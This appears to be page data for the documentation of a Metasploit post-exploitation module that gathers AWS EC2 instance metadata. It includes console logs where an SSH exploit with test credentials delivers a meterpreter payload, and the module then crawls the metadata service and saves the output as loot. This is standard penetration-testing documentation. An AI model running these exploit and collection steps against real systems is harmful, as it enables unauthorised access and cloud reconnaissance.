{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/multi/gather/aws_ec2_instance_metadata","result":{"data":{"moduleMetadataJson":{"id":"32b1491b-dfc6-545c-8e21-fc7b4700c101","name":"Gather AWS EC2 Instance Metadata","fullname":"post/multi/gather/aws_ec2_instance_metadata","description":"This module will attempt to connect to the AWS EC2 instance metadata service\n          and crawl and collect all metadata known about the session'd host.","rank":300,"fields":{"detailsSlug":"/modules/details/post/multi/gather/aws_ec2_instance_metadata","documentationSlug":"/modules/documentation/post/multi/gather/aws_ec2_instance_metadata","referencesSlug":"/modules/references/post/multi/gather/aws_ec2_instance_metadata"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  This module uses an existing session on an AWS EC2 instance to gather\nthe metadata about the instance.  As such, any EC2 instance with <code class=\"language-text\">curl</code>\nis an applicable target.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Get session</li>\n<li>Do <code class=\"language-text\">use post/multi/gather/aws_ec2_instance_metadata</code></li>\n<li>Do <code class=\"language-text\">set SESSION &lt;session id&gt;</code></li>\n<li>Do <code class=\"language-text\">run</code></li>\n<li>See loot.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  Set <code class=\"language-text\">VERBOSE</code> to <code class=\"language-text\">true</code> if you would like the AWS EC2 instance metadata to be shown\nin addition to being stored.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>  Default, non-verbose mode:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (msf.rc)&gt; use exploit/multi/ssh/sshexec\nresource (msf.rc)&gt; set PASSWORD test\nPASSWORD =&gt; test\nresource (msf.rc)&gt; set USERNAME test\nUSERNAME =&gt; test\nresource (msf.rc)&gt; set PAYLOAD linux/x86/meterpreter/bind_tcp\nPAYLOAD =&gt; linux/x86/meterpreter/bind_tcp\nresource (msf.rc)&gt; set RHOST 192.168.2.2\nRHOST =&gt; 192.168.2.2\nresource (msf.rc)&gt; run -j\n[*] Exploit running as background job.\nresource (msf.rc)&gt; sleep 10\n[*] Started bind handler\n[*] Transmitting intermediate stager for over-sized stage...(105 bytes)\n[*] 192.168.2.2:22 - Sending stager...\n[*] Command Stager progress -  42.09% done (306/727 bytes)\n[*] Sending stage (1495599 bytes) to 192.168.2.2\n[*] Command Stager progress - 100.00% done (727/727 bytes)\n[*] Meterpreter session 1 opened (192.168.1.149:52075 -&gt; 192.168.2.2:4444) at 2016-09-30 06:40:44 -0700\n\nresource (msf.rc)&gt; use post/multi/gather/aws_ec2_instance_metadata\nresource (msf.rc)&gt; set SESSION 1\nSESSION =&gt; 1\nresource (msf.rc)&gt; run\n[*] Gathering AWS EC2 instance metadata\n[+] Saved AWS EC2 instance metadata to to /Users/jhart/.msf4/loot/20160930064126_default_192.168.2.2_aws.ec2.instance_509214.txt\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  Non-default, verbose mode:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (msf.rc)&gt; use exploit/multi/ssh/sshexec\nresource (msf.rc)&gt; set PASSWORD test\nPASSWORD =&gt; test\nresource (msf.rc)&gt; set USERNAME test\nUSERNAME =&gt; test\nresource (msf.rc)&gt; set PAYLOAD linux/x86/meterpreter/bind_tcp\nPAYLOAD =&gt; linux/x86/meterpreter/bind_tcp\nresource (msf.rc)&gt; set RHOST 192.168.2.2\nRHOST =&gt; 192.168.2.2\nresource (msf.rc)&gt; run -j\n[*] Exploit running as background job.\nresource (msf.rc)&gt; sleep 10\n[*] Started bind handler\n[*] Transmitting intermediate stager for over-sized stage...(105 bytes)\n[*] 192.168.2.2:22 - Sending stager...\n[*] Command Stager progress -  42.09% done (306/727 bytes)\n[*] Sending stage (1495599 bytes) to 192.168.2.2\n[*] Command Stager progress - 100.00% done (727/727 bytes)\n[*] Meterpreter session 1 opened (192.168.1.149:52775 -&gt; 192.168.2.2:4444) at 2016-09-30 06:55:54 -0700\nresource (msf.rc)&gt; use post/multi/gather/aws_ec2_instance_metadata\nresource (msf.rc)&gt; set SESSION 1\nSESSION =&gt; 1\nresource (msf.rc)&gt; set VERBOSE true\nVERBOSE =&gt; true\nresource (msf.rc)&gt; run\n[*] Fetching http://169.254.169.254/latest/meta-data/\n[*] Gathering AWS EC2 instance metadata\n[*] Fetching http://169.254.169.254/latest/meta-data/ami-id\n[*] Fetching http://169.254.169.254/latest/meta-data/ami-launch-index\n[*] Fetching http://169.254.169.254/latest/meta-data/ami-manifest-path\n[*] Fetching http://169.254.169.254/latest/meta-data/block-device-mapping/\n[*] Fetching http://169.254.169.254/latest/meta-data/block-device-mapping/ami\n[*] Fetching http://169.254.169.254/latest/meta-data/block-device-mapping/root\n[*] Fetching http://169.254.169.254/latest/meta-data/hostname\n[*] Fetching http://169.254.169.254/latest/meta-data/instance-action\n[*] Fetching http://169.254.169.254/latest/meta-data/instance-id\n[*] Fetching http://169.254.169.254/latest/meta-data/instance-type\n[*] Fetching http://169.254.169.254/latest/meta-data/local-hostname\n[*] Fetching http://169.254.169.254/latest/meta-data/local-ipv4\n[*] Fetching http://169.254.169.254/latest/meta-data/mac\n[*] Fetching http://169.254.169.254/latest/meta-data/metrics/\n[*] Fetching http://169.254.169.254/latest/meta-data/metrics/vhostmd\n[*] Fetching http://169.254.169.254/latest/meta-data/network/\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/device-number\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/interface-id\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/ipv4-associations/\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/ipv4-associations/192.168.2.2\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/local-hostname\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/local-ipv4s\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/mac\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/owner-id\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/public-hostname\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/public-ipv4s\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/security-group-ids\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/security-groups\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/subnet-id\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/subnet-ipv4-cidr-block\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/vpc-id\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/vpc-ipv4-cidr-block\n[*] Fetching http://169.254.169.254/latest/meta-data/network/interfaces/macs/aa:bb:cc:dd:ee:ff/vpc-ipv4-cidr-blocks\n[*] Fetching http://169.254.169.254/latest/meta-data/placement/\n[*] Fetching http://169.254.169.254/latest/meta-data/placement/availability-zone\n[*] Fetching http://169.254.169.254/latest/meta-data/profile\n[*] Fetching http://169.254.169.254/latest/meta-data/public-hostname\n[*] Fetching http://169.254.169.254/latest/meta-data/public-ipv4\n[*] Fetching http://169.254.169.254/latest/meta-data/public-keys/\n[*] Fetching http://169.254.169.254/latest/meta-data/public-keys/0/\n[*] Fetching http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key\n[*] Fetching http://169.254.169.254/latest/meta-data/reservation-id\n[*] Fetching http://169.254.169.254/latest/meta-data/security-groups\n[*] Fetching http://169.254.169.254/latest/meta-data/services/\n[*] Fetching http://169.254.169.254/latest/meta-data/services/domain\n[*] Fetching http://169.254.169.254/latest/meta-data/services/partition\n[+] AWS EC2 instance metadata\n{\n  &quot;ami-id&quot;: &quot;ami-2d39803a&quot;,\n  &quot;ami-launch-index&quot;: &quot;0&quot;,\n  &quot;ami-manifest-path&quot;: &quot;(unknown)&quot;,\n  &quot;block-device-mapping&quot;: {\n    &quot;ami&quot;: &quot;/dev/sda1&quot;,\n    &quot;root&quot;: &quot;/dev/sda1&quot;\n  },\n  &quot;hostname&quot;: &quot;ip-192.168.2.2.ec2.internal&quot;,\n  &quot;instance-action&quot;: &quot;none&quot;,\n  &quot;instance-id&quot;: &quot;i-16fffae&quot;,\n  &quot;instance-type&quot;: &quot;t2.medium&quot;,\n  &quot;local-hostname&quot;: &quot;ip-192.168.2.2.ec2.internal&quot;,\n  &quot;local-ipv4&quot;: &quot;192.168.2.2&quot;,\n  &quot;mac&quot;: &quot;aa:bb:cc:dd:ee:ff&quot;,\n  &quot;metrics&quot;: {\n    &quot;vhostmd&quot;: &quot;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;UTF-8\\&quot;?&gt;&quot;\n  },\n  &quot;network&quot;: {\n    &quot;interfaces&quot;: {\n      &quot;macs&quot;: {\n        &quot;aa:bb:cc:dd:ee:ff&quot;: {\n          &quot;device-number&quot;: &quot;0&quot;,\n          &quot;interface-id&quot;: &quot;eni-1234ff&quot;,\n          &quot;ipv4-associations&quot;: {\n            &quot;192.168.2.2&quot;: &quot;192.168.2.2&quot;\n          },\n          &quot;local-hostname&quot;: &quot;ip-192.168.2.2.ec2.internal&quot;,\n          &quot;local-ipv4s&quot;: &quot;192.168.2.2&quot;,\n          &quot;mac&quot;: &quot;aa:bb:cc:dd:ee:ff&quot;,\n          &quot;owner-id&quot;: &quot;186638383&quot;,\n          &quot;public-hostname&quot;: &quot;ec2-192.168.2.2.compute-1.amazonaws.com&quot;,\n          &quot;public-ipv4s&quot;: &quot;192.168.2.2&quot;,\n          &quot;security-group-ids&quot;: &quot;sg-123a7&quot;,\n          &quot;security-groups&quot;: &quot;launch-wizard-15&quot;,\n          &quot;subnet-id&quot;: &quot;subnet-123453d&quot;,\n          &quot;subnet-ipv4-cidr-block&quot;: &quot;192.0.2.0/24&quot;,\n          &quot;vpc-id&quot;: &quot;vpc-fffffff&quot;,\n          &quot;vpc-ipv4-cidr-block&quot;: &quot;192.0.0.0/16&quot;,\n          &quot;vpc-ipv4-cidr-blocks&quot;: &quot;192.0.0.0/16&quot;\n        }\n      }\n    }\n  },\n  &quot;placement&quot;: {\n    &quot;availability-zone&quot;: &quot;us-east-1e&quot;\n  },\n  &quot;profile&quot;: &quot;default-hvm&quot;,\n  &quot;public-hostname&quot;: &quot;ec2-192.168.2.2.compute-1.amazonaws.com&quot;,\n  &quot;public-ipv4&quot;: &quot;192.168.2.2&quot;,\n  &quot;public-keys&quot;: {\n    &quot;0&quot;: {\n      &quot;openssh-key&quot;: &quot;ssh-rsa &lt;...redacted...&gt; jhart&quot;\n    }\n  },\n  &quot;reservation-id&quot;: &quot;r-8675309&quot;,\n  &quot;security-groups&quot;: &quot;launch-wizard-15&quot;,\n  &quot;services&quot;: {\n    &quot;domain&quot;: &quot;amazonaws.com&quot;,\n    &quot;partition&quot;: &quot;aws&quot;\n  }\n}\n[+] Saved AWS EC2 instance metadata to to /Users/jhart/.msf4/loot/20160930065628_default_192.168.2.2_aws.ec2.instance_622503.txt\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"32b1491b-dfc6-545c-8e21-fc7b4700c101"}}}